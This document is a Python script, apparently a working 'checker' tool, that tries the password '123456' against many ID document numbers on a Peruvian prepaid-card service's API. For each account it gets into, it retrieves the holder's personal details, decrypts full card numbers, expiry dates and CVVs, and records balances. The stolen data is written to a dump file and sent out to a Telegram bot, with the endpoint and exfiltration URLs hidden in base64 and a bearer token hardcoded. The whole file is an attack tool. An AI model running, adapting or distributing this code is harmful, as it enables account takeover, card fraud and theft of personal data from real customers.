import base64, requests, os, urllib3
from colored import fg, bg, attr
import concurrent.futures
from pwn import *
import time

urllib3.disable_warnings()
Bot = requests.session()
list_doc = []

checked = 0
account_valid = 0
account_invalid = 0
locked = 0

def update_console():
    os.system(f'title "Checker Ligo - Dump´s | verificadas/total {checked}/{len(list_doc)} | Con tarjetas : {account_valid} | Sin Tarjetas : {account_invalid} | Bloqueados : {locked}"')
os.system('cls')
update_console()

def obtiene(doc):
    global checked, account_valid, account_invalid, locked
    try:
        time.sleep(2)
        Login = Bot.post(base64.b64decode('aHR0cHM6Ly9wZXJzb25hc2xpZ29hcGkudGFyamV0YWxhbWFnaWNhLmNvbS5wZS90cHAvYXBpL3YyL2xvZ2lu').decode('utf-8'), headers={'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjllZTMzN2YyYmY5ZjdlMTQwYzBiMGY0YzE1YzY5YTFkNjYzOTNiZWNlMTEyNzZmNmEwZjkzMjcyMGU1ZWI5ZWRjZmE0NTlmNGVjMTljOWY3In0.eyJhdWQiOiI4IiwianRpIjoiOWVlMzM3ZjJiZjlmN2UxNDBjMGIwZjRjMTVjNjlhMWQ2NjM5M2JlY2UxMTI3NmY2YTBmOTMyNzIwZTVlYjllZGNmYTQ1OWY0ZWMxOWM5ZjciLCJpYXQiOjE2MDMzNDAyMzEsIm5iZiI6MTYwMzM0MDIzMSwiZXhwIjoxNjM0ODc2MjMxLCJzdWIiOiIiLCJzY29wZXMiOltdfQ.TA3wV_9lmrRSgJSZ-QxiDrNqRfeGQZGFZuEaxSjwa2Zif60EcnwvM_rYUlE9S8f7T1US_5QjmJO4kksfVQeBOdP-xiaGYwdM92vLy22U7H4l1hVVcT286DzYaD1pchYVvRjZfc6gb7brjTTiPB5uNIHi7cAVB1YxWNrEN7-hgjogRJBcZCuIAy4MlTL9jsSUBvpFY9fdedApqgTMKM8QzMm0hB_tbTCGNju9OraAYxVLKhJgiUF679ozNSXa1CeMv8TUxAfYlEv10ZSWYPnAwutcGJvFd-c8Wu7eHfetWCv1CZ76w3ykyuNv0WUdSOJNKeoqA3hfNynxARdM-lmJwXrLyfd2d5jAZuZ7wLD2jjpg2z54W_qYlFpb21PqhhB7MLqJXCLR8bPNzr_n1DrweLSVUgGfIXkCpOrcEuAHEBMxv3Yn2j9zUDcg3Cqh6jy9ZhmRbizzw58HraYAo3VM7LwQwc3DlI7TaA3aGi3S8gabw1SLZAtHk-FQQdIUo2Q7nQ3xI85XM6mN2sohgdu__GN3KdAk74Tl_iZK87iBP_GV9lZv9iwxqjH1X5DC-qpTo_qA1z57tn_MzI2BAnjFKpktLn0Clf4bhV-AvPIXsEjn-XxxLuf74DUHzJOGa1ceMkCsQ04tx1xxrPhEG4VVN6IcDu7x5TPWOGKrxANvtto','Content-Type': 'application/json'}, json={"doc_type": 1,"doc_number": str(doc),"password": "123456"})
        checked += 1
        update_console()
        if Login.status_code == 200:
            if Login.json().get('code') == 200:
                Clientes = Bot.get(base64.b64decode('aHR0cHM6Ly9wZXJzb25hc2xpZ29hcGkudGFyamV0YWxhbWFnaWNhLmNvbS5wZS90cHAvYXBpL3YyL2NsaWVudHMv').decode('utf-8')+str(Login.json().get('data').get('client_id')),headers = {'token': str(Login.json().get('data').get('token')),'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjllZTMzN2YyYmY5ZjdlMTQwYzBiMGY0YzE1YzY5YTFkNjYzOTNiZWNlMTEyNzZmNmEwZjkzMjcyMGU1ZWI5ZWRjZmE0NTlmNGVjMTljOWY3In0.eyJhdWQiOiI4IiwianRpIjoiOWVlMzM3ZjJiZjlmN2UxNDBjMGIwZjRjMTVjNjlhMWQ2NjM5M2JlY2UxMTI3NmY2YTBmOTMyNzIwZTVlYjllZGNmYTQ1OWY0ZWMxOWM5ZjciLCJpYXQiOjE2MDMzNDAyMzEsIm5iZiI6MTYwMzM0MDIzMSwiZXhwIjoxNjM0ODc2MjMxLCJzdWIiOiIiLCJzY29wZXMiOltdfQ.TA3wV_9lmrRSgJSZ-QxiDrNqRfeGQZGFZuEaxSjwa2Zif60EcnwvM_rYUlE9S8f7T1US_5QjmJO4kksfVQeBOdP-xiaGYwdM92vLy22U7H4l1hVVcT286DzYaD1pchYVvRjZfc6gb7brjTTiPB5uNIHi7cAVB1YxWNrEN7-hgjogRJBcZCuIAy4MlTL9jsSUBvpFY9fdedApqgTMKM8QzMm0hB_tbTCGNju9OraAYxVLKhJgiUF679ozNSXa1CeMv8TUxAfYlEv10ZSWYPnAwutcGJvFd-c8Wu7eHfetWCv1CZ76w3ykyuNv0WUdSOJNKeoqA3hfNynxARdM-lmJwXrLyfd2d5jAZuZ7wLD2jjpg2z54W_qYlFpb21PqhhB7MLqJXCLR8bPNzr_n1DrweLSVUgGfIXkCpOrcEuAHEBMxv3Yn2j9zUDcg3Cqh6jy9ZhmRbizzw58HraYAo3VM7LwQwc3DlI7TaA3aGi3S8gabw1SLZAtHk-FQQdIUo2Q7nQ3xI85XM6mN2sohgdu__GN3KdAk74Tl_iZK87iBP_GV9lZv9iwxqjH1X5DC-qpTo_qA1z57tn_MzI2BAnjFKpktLn0Clf4bhV-AvPIXsEjn-XxxLuf74DUHzJOGa1ceMkCsQ04tx1xxrPhEG4VVN6IcDu7x5TPWOGKrxANvtto'})
                if Clientes.status_code == 200:
                    if Clientes.json().get('code') == 200:
                        F = open('Dump_cc.txt', 'a+')
                        F.write('****************** DUMP OBTENIDO ******************\n')
                        CC_cliente = Bot.post(base64.b64decode('aHR0cHM6Ly9wZXJzb25hc2xpZ29hcGkudGFyamV0YWxhbWFnaWNhLmNvbS5wZS90cHAvYXBpL3YyL2NhcmRz').decode('utf-8'), headers = {'token': str(Login.json().get('data').get('token')),'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjllZTMzN2YyYmY5ZjdlMTQwYzBiMGY0YzE1YzY5YTFkNjYzOTNiZWNlMTEyNzZmNmEwZjkzMjcyMGU1ZWI5ZWRjZmE0NTlmNGVjMTljOWY3In0.eyJhdWQiOiI4IiwianRpIjoiOWVlMzM3ZjJiZjlmN2UxNDBjMGIwZjRjMTVjNjlhMWQ2NjM5M2JlY2UxMTI3NmY2YTBmOTMyNzIwZTVlYjllZGNmYTQ1OWY0ZWMxOWM5ZjciLCJpYXQiOjE2MDMzNDAyMzEsIm5iZiI6MTYwMzM0MDIzMSwiZXhwIjoxNjM0ODc2MjMxLCJzdWIiOiIiLCJzY29wZXMiOltdfQ.TA3wV_9lmrRSgJSZ-QxiDrNqRfeGQZGFZuEaxSjwa2Zif60EcnwvM_rYUlE9S8f7T1US_5QjmJO4kksfVQeBOdP-xiaGYwdM92vLy22U7H4l1hVVcT286DzYaD1pchYVvRjZfc6gb7brjTTiPB5uNIHi7cAVB1YxWNrEN7-hgjogRJBcZCuIAy4MlTL9jsSUBvpFY9fdedApqgTMKM8QzMm0hB_tbTCGNju9OraAYxVLKhJgiUF679ozNSXa1CeMv8TUxAfYlEv10ZSWYPnAwutcGJvFd-c8Wu7eHfetWCv1CZ76w3ykyuNv0WUdSOJNKeoqA3hfNynxARdM-lmJwXrLyfd2d5jAZuZ7wLD2jjpg2z54W_qYlFpb21PqhhB7MLqJXCLR8bPNzr_n1DrweLSVUgGfIXkCpOrcEuAHEBMxv3Yn2j9zUDcg3Cqh6jy9ZhmRbizzw58HraYAo3VM7LwQwc3DlI7TaA3aGi3S8gabw1SLZAtHk-FQQdIUo2Q7nQ3xI85XM6mN2sohgdu__GN3KdAk74Tl_iZK87iBP_GV9lZv9iwxqjH1X5DC-qpTo_qA1z57tn_MzI2BAnjFKpktLn0Clf4bhV-AvPIXsEjn-XxxLuf74DUHzJOGa1ceMkCsQ04tx1xxrPhEG4VVN6IcDu7x5TPWOGKrxANvtto','Content-Type': 'application/json'}, json={"client_id": str(Login.json().get('data').get('client_id')),"all": 0,"paypal": 0})
                        if CC_cliente.status_code == 200:
                            t = f"{Clientes.json().get('data').get('name')} {Clientes.json().get('data').get('surname_1')} {Clientes.json().get('data').get('surname_2')}"
                            if 'No hay resultados para mostrar' in CC_cliente.text:
                                account_invalid += 1
                                log.success('****************** DUMP OBTENIDO ******************\nTitular : '+t+'\nDocumento : '+str(doc)+'\nCorreo : '+str(Clientes.json().get('data').get('email'))+'\nCelular : '+str(Clientes.json().get('data').get('cellphone'))+'\nTarjetas : '+str(Clientes.json().get('data').get('cards'))+' asociadas.\n')
                                F.write('Titular : '+t+'\nDocumento : '+str(doc)+'\nCorreo : '+str(Clientes.json().get('data').get('email'))+'\nCelular : '+str(Clientes.json().get('data').get('cellphone'))+'\nTarjetas : '+str(Clientes.json().get('data').get('cards'))+' asociadas.')
                                Bot.post(base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE0MDY1MTg5Mzg6QUFFNjh0eHdTcTYzYzRLTk85X3E4Sm5zTzE0X3hhbXFzTTQvc2VuZE1lc3NhZ2U=').decode('utf-8'), data={'chat_id': '-522089308','text': '********** DUMP OBTENIDO *********\nDocumento : '+str(doc)+'\nTitular : '+t+'\nEmail : '+str(Clientes.json().get('data').get('email'))+'\nCelular : '+str(Clientes.json().get('data').get('cellphone'))+'\nTarjetas : '+str(Clientes.json().get('data').get('cards'))+' asociadas.'})
                                update_console()
                                F.close()
                            else:
                                F.write('Titular : '+t+'\nDocumento : '+str(doc)+'\nCorreo : '+str(Clientes.json().get('data').get('email'))+'\nCelular : '+str(Clientes.json().get('data').get('cellphone'))+'\nTarjetas : '+str(Clientes.json().get('data').get('cards'))+' asociadas\n')
                                account_valid += 1
                                update_console()
                                for card in CC_cliente.json().get('data'):
                                    F.write('Tarjeta encriptada : '+str(card['encrypted_card'])+'\nEstado : '+str(card['status_name'])+'\n')
                                    Saldo = Bot.get(base64.b64decode('aHR0cHM6Ly9wZXJzb25hc2xpZ29hcGkudGFyamV0YWxhbWFnaWNhLmNvbS5wZS90cHAvYXBpL3YyL2NhcmRzLw==').decode('utf-8')+str(card['card_id']),headers = {'token': str(Login.json().get('data').get('token')),'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjllZTMzN2YyYmY5ZjdlMTQwYzBiMGY0YzE1YzY5YTFkNjYzOTNiZWNlMTEyNzZmNmEwZjkzMjcyMGU1ZWI5ZWRjZmE0NTlmNGVjMTljOWY3In0.eyJhdWQiOiI4IiwianRpIjoiOWVlMzM3ZjJiZjlmN2UxNDBjMGIwZjRjMTVjNjlhMWQ2NjM5M2JlY2UxMTI3NmY2YTBmOTMyNzIwZTVlYjllZGNmYTQ1OWY0ZWMxOWM5ZjciLCJpYXQiOjE2MDMzNDAyMzEsIm5iZiI6MTYwMzM0MDIzMSwiZXhwIjoxNjM0ODc2MjMxLCJzdWIiOiIiLCJzY29wZXMiOltdfQ.TA3wV_9lmrRSgJSZ-QxiDrNqRfeGQZGFZuEaxSjwa2Zif60EcnwvM_rYUlE9S8f7T1US_5QjmJO4kksfVQeBOdP-xiaGYwdM92vLy22U7H4l1hVVcT286DzYaD1pchYVvRjZfc6gb7brjTTiPB5uNIHi7cAVB1YxWNrEN7-hgjogRJBcZCuIAy4MlTL9jsSUBvpFY9fdedApqgTMKM8QzMm0hB_tbTCGNju9OraAYxVLKhJgiUF679ozNSXa1CeMv8TUxAfYlEv10ZSWYPnAwutcGJvFd-c8Wu7eHfetWCv1CZ76w3ykyuNv0WUdSOJNKeoqA3hfNynxARdM-lmJwXrLyfd2d5jAZuZ7wLD2jjpg2z54W_qYlFpb21PqhhB7MLqJXCLR8bPNzr_n1DrweLSVUgGfIXkCpOrcEuAHEBMxv3Yn2j9zUDcg3Cqh6jy9ZhmRbizzw58HraYAo3VM7LwQwc3DlI7TaA3aGi3S8gabw1SLZAtHk-FQQdIUo2Q7nQ3xI85XM6mN2sohgdu__GN3KdAk74Tl_iZK87iBP_GV9lZv9iwxqjH1X5DC-qpTo_qA1z57tn_MzI2BAnjFKpktLn0Clf4bhV-AvPIXsEjn-XxxLuf74DUHzJOGa1ceMkCsQ04tx1xxrPhEG4VVN6IcDu7x5TPWOGKrxANvtto','Content-Type': 'application/json'})
                                    if card['status_name'] == 'Activa':
                                        mostrarCC = Bot.post(base64.b64decode('aHR0cHM6Ly9wZXJzb25hc2xpZ29hcGkudGFyamV0YWxhbWFnaWNhLmNvbS5wZS90cHAvYXBpL3YyL3Nob3dfY2FyZA==').decode('utf-8'), headers = {'token': str(Login.json().get('data').get('token')),'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjllZTMzN2YyYmY5ZjdlMTQwYzBiMGY0YzE1YzY5YTFkNjYzOTNiZWNlMTEyNzZmNmEwZjkzMjcyMGU1ZWI5ZWRjZmE0NTlmNGVjMTljOWY3In0.eyJhdWQiOiI4IiwianRpIjoiOWVlMzM3ZjJiZjlmN2UxNDBjMGIwZjRjMTVjNjlhMWQ2NjM5M2JlY2UxMTI3NmY2YTBmOTMyNzIwZTVlYjllZGNmYTQ1OWY0ZWMxOWM5ZjciLCJpYXQiOjE2MDMzNDAyMzEsIm5iZiI6MTYwMzM0MDIzMSwiZXhwIjoxNjM0ODc2MjMxLCJzdWIiOiIiLCJzY29wZXMiOltdfQ.TA3wV_9lmrRSgJSZ-QxiDrNqRfeGQZGFZuEaxSjwa2Zif60EcnwvM_rYUlE9S8f7T1US_5QjmJO4kksfVQeBOdP-xiaGYwdM92vLy22U7H4l1hVVcT286DzYaD1pchYVvRjZfc6gb7brjTTiPB5uNIHi7cAVB1YxWNrEN7-hgjogRJBcZCuIAy4MlTL9jsSUBvpFY9fdedApqgTMKM8QzMm0hB_tbTCGNju9OraAYxVLKhJgiUF679ozNSXa1CeMv8TUxAfYlEv10ZSWYPnAwutcGJvFd-c8Wu7eHfetWCv1CZ76w3ykyuNv0WUdSOJNKeoqA3hfNynxARdM-lmJwXrLyfd2d5jAZuZ7wLD2jjpg2z54W_qYlFpb21PqhhB7MLqJXCLR8bPNzr_n1DrweLSVUgGfIXkCpOrcEuAHEBMxv3Yn2j9zUDcg3Cqh6jy9ZhmRbizzw58HraYAo3VM7LwQwc3DlI7TaA3aGi3S8gabw1SLZAtHk-FQQdIUo2Q7nQ3xI85XM6mN2sohgdu__GN3KdAk74Tl_iZK87iBP_GV9lZv9iwxqjH1X5DC-qpTo_qA1z57tn_MzI2BAnjFKpktLn0Clf4bhV-AvPIXsEjn-XxxLuf74DUHzJOGa1ceMkCsQ04tx1xxrPhEG4VVN6IcDu7x5TPWOGKrxANvtto','Content-Type': 'application/json'}, json={"client_id": str(Login.json().get('data').get('client_id')),"card_id": str(card['card_id']),"random_parameter": str(Login.json().get('data').get('random_parameter'))})
                                        Mc_E = [mostrarCC.json().get('data').get('card'),mostrarCC.json().get('data').get('exp'),mostrarCC.json().get('data').get('cvv')]
                                        Mc_D = []
                                        for data_cc in Mc_E:
                                            Cc_decrypt = Bot.post(base64.b64decode('aHR0cHM6Ly9wZXJzb25hc2xpZ29hcGkudGFyamV0YWxhbWFnaWNhLmNvbS5wZS90cHAvYXBpL3YyL2RlY3J5cHQ=').decode('utf-8'), headers = {'token': str(Login.json().get('data').get('token')),'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjllZTMzN2YyYmY5ZjdlMTQwYzBiMGY0YzE1YzY5YTFkNjYzOTNiZWNlMTEyNzZmNmEwZjkzMjcyMGU1ZWI5ZWRjZmE0NTlmNGVjMTljOWY3In0.eyJhdWQiOiI4IiwianRpIjoiOWVlMzM3ZjJiZjlmN2UxNDBjMGIwZjRjMTVjNjlhMWQ2NjM5M2JlY2UxMTI3NmY2YTBmOTMyNzIwZTVlYjllZGNmYTQ1OWY0ZWMxOWM5ZjciLCJpYXQiOjE2MDMzNDAyMzEsIm5iZiI6MTYwMzM0MDIzMSwiZXhwIjoxNjM0ODc2MjMxLCJzdWIiOiIiLCJzY29wZXMiOltdfQ.TA3wV_9lmrRSgJSZ-QxiDrNqRfeGQZGFZuEaxSjwa2Zif60EcnwvM_rYUlE9S8f7T1US_5QjmJO4kksfVQeBOdP-xiaGYwdM92vLy22U7H4l1hVVcT286DzYaD1pchYVvRjZfc6gb7brjTTiPB5uNIHi7cAVB1YxWNrEN7-hgjogRJBcZCuIAy4MlTL9jsSUBvpFY9fdedApqgTMKM8QzMm0hB_tbTCGNju9OraAYxVLKhJgiUF679ozNSXa1CeMv8TUxAfYlEv10ZSWYPnAwutcGJvFd-c8Wu7eHfetWCv1CZ76w3ykyuNv0WUdSOJNKeoqA3hfNynxARdM-lmJwXrLyfd2d5jAZuZ7wLD2jjpg2z54W_qYlFpb21PqhhB7MLqJXCLR8bPNzr_n1DrweLSVUgGfIXkCpOrcEuAHEBMxv3Yn2j9zUDcg3Cqh6jy9ZhmRbizzw58HraYAo3VM7LwQwc3DlI7TaA3aGi3S8gabw1SLZAtHk-FQQdIUo2Q7nQ3xI85XM6mN2sohgdu__GN3KdAk74Tl_iZK87iBP_GV9lZv9iwxqjH1X5DC-qpTo_qA1z57tn_MzI2BAnjFKpktLn0Clf4bhV-AvPIXsEjn-XxxLuf74DUHzJOGa1ceMkCsQ04tx1xxrPhEG4VVN6IcDu7x5TPWOGKrxANvtto'}, json={"parameter": data_cc})
                                            Mc_D.append(Cc_decrypt.json().get('data').get('decrypted'))
                                        log.success('****************** DUMP OBTENIDO ******************\nTitular : '+t+'\nDocumento : '+str(doc)+'\nCorreo : '+str(Clientes.json().get('data').get('email'))+'\nCelular : '+str(Clientes.json().get('data').get('cellphone'))+'\nTarjetas : '+str(Clientes.json().get('data').get('cards'))+' asociadas.\nTarjeta encriptada : '+str(card['encrypted_card'])+'\nEstado : '+str(card['status_name'])+'\nTarjeta : '+str(Mc_D[0])+'\nFecha : '+str(Mc_D[1])+'\nCvv : '+str(Mc_D[2])+'\nSaldo : S/ '+str(Saldo.json().get('data').get('amount'))+' Soles.\n')
                                        F.write('Tarjeta : '+str(Mc_D[0])+'\nFecha : '+str(Mc_D[1])+'\nCvv : '+str(Mc_D[2])+'\n')
                                        F.write('Saldo : S/ '+str(Saldo.json().get('data').get('amount'))+' Soles.\n')
                                        Bot.post(base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE0MDY1MTg5Mzg6QUFFNjh0eHdTcTYzYzRLTk85X3E4Sm5zTzE0X3hhbXFzTTQvc2VuZE1lc3NhZ2U=').decode('utf-8'), data={'chat_id': '-522089308','text': '******** DUMP OBTENIDO ********\nTitular : '+t+'\nDocumento : '+str(doc)+'\nCorreo : '+str(Clientes.json().get('data').get('email'))+'\nCelular : '+str(Clientes.json().get('data').get('cellphone'))+'\nTarjetas : '+str(Clientes.json().get('data').get('cards'))+' asociadas.\nTarjeta encriptada : '+str(card['encrypted_card'])+'\nEstado : '+str(card['status_name'])+'\nTarjeta : '+str(Mc_D[0])+'\nFecha : '+str(Mc_D[1])+'\nCvv : '+str(Mc_D[2])+'\nSaldo : S/ '+str(Saldo.json().get('data').get('amount'))+' Soles.\n'})
                                    else:
                                        pass
                        else:
                            log.warning('Error en la peticion >CC_cliente<.',str(CC_cliente.status_code))
                    else:
                        log.failure('Error al obtener los datos de cliente.')
                else:
                    log.warning('Error en la peticion >Clientes<.',str(Clientes.status_code))
            else:
                log.failure(f'Usuario {str(doc)} bloqueado o contraseña incorrecta.')
                locked += 1
                update_console()
        else:
            log.warning('Error en la peticón.', str(Login.status_code))
    except Exception as e:
        print(e)

if __name__ == '__main__':
    print(fg('purple_1a')+"""
                 __   _           _______           __          
                / /  (_)__ ____  / ___/ /  ___ ____/ /_____ ____
               / /__/ / _ `/ _ \/ /__/ _ \/ -_) __/  '_/ -_) __/
              /____/_/\_, /\___/\___/_//_/\__/\__/_/\_\\__/_/   
                     /___/\n\t\t\t\tPowered By : DakOvs77\n"""+attr('reset'))
    
    ruta = input(fg("yellow")+'Ingresa la ruta de los documentos => '+attr('reset'))
    with open(ruta) as doc:
        lines = [lines.rstrip() for lines in doc]
        for document in lines:
            list_doc.append(document)

    with concurrent.futures.ThreadPoolExecutor() as ligoDead:
        ligoDead.map(obtiene, list_doc)
    log.success(f'************************\nCombo : {len(list_doc)}\nCon Tarjeta : {account_valid}\nSin Tarjeta : {account_invalid}\nBloqueados : {locked}\n************************')